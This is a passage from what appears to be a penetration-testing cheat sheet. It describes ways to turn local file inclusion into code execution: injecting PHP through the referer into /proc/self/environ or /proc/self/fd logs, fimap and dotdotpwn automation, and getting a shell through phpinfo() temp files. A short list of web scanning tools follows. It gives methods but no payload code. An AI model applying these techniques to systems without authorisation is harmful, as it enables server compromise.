# After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.

# /proc/self/fd/ LFI Method
# Similar to the previous /proc/self/environ method, it’s possible to introduce code 
# into the proc log files that can be executed via your vulnerable LFI script. 
# Typically you would use burp or curl to inject PHP code into the referer.

# This method is a little tricky as the proc file that contains the Apache error log 
# information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc. 
# I’d recommend brute forcing the directory structure of the /proc/self/fd/ directory with 
# Burp Intruder + FuzzDB’s LFI-FD-Check.txt list of likely proc files, you can then monitor 
# the returned page sizes and investigate.

# fimap LFI Pen Testing Tool
# fimap is a tool used on pen tests that automates the above processes of discovering 
# and exploiting LFI scripts. Upon discovering a vulnerable LFI script fimap will enumerate 
# the local filesystem and search for writable log files or locations such as /proc/self/environ. 
# Another tool commonly used by pen testes to automate LFI discovery is Kali’s dotdotpwn, 
# which works in a similar way.

# fimap + phpinfo() Exploit
# Fimap exploits PHP’s temporary file creation via Local File Inclusion by abusing PHPinfo() 
# information disclosure glitch to reveal the location of the created temporary file.

# If a phpinfo() file is present, it’s usually possible to get a shell, 
# if you don’t know the location of the phpinfo file fimap can probe for it, 
# or you could use a tool like OWASP DirBuster.












Scan Website:
=============
nikto
dirb
dirbuster
gobuster
wfuzz 
wpscan
